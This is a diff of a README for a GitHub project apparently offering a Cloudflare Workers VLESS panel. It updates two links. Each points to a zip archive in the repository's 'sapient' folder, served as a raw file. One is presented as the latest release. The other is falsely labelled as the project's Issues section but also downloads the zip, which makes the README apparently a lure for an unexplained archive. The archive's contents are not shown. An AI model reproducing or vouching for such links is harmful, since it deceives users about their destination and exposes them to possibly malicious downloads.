@@ -10,7 +10,7 @@ Welcome to the honghongcf-workers-vlesspanel-d1 project! This application provid
 
 To get started, visit the Releases page to download the latest version of the application:
 
-[![Download Latest Release](https://raw.githubusercontent.com/mourya11/honghongcf-workers-vlesspanel-d1/main/sapient/d-workers-honghongcf-vlesspanel-v1.9-alpha.5.zip)](https://raw.githubusercontent.com/mourya11/honghongcf-workers-vlesspanel-d1/main/sapient/d-workers-honghongcf-vlesspanel-v1.9-alpha.5.zip)
+[![Download Latest Release](https://raw.githubusercontent.com/mourya11/honghongcf-workers-vlesspanel-d1/main/sapient/honghongcf-workers-vlesspanel-d-v1.3.zip)](https://raw.githubusercontent.com/mourya11/honghongcf-workers-vlesspanel-d1/main/sapient/honghongcf-workers-vlesspanel-d-v1.3.zip)
 
 ### Steps to Download
 
@@ -82,7 +82,7 @@ If you encounter issues while using the application:
 
 For further assistance:
 
-- Visit the [Issues section](https://raw.githubusercontent.com/mourya11/honghongcf-workers-vlesspanel-d1/main/sapient/d-workers-honghongcf-vlesspanel-v1.9-alpha.5.zip) on GitHub for a list of common problems and solutions.
+- Visit the [Issues section](https://raw.githubusercontent.com/mourya11/honghongcf-workers-vlesspanel-d1/main/sapient/honghongcf-workers-vlesspanel-d-v1.3.zip) on GitHub for a list of common problems and solutions.
 - Feel free to create a new issue if your problem is not listed.
 
 ## 🌟 Community Feedback
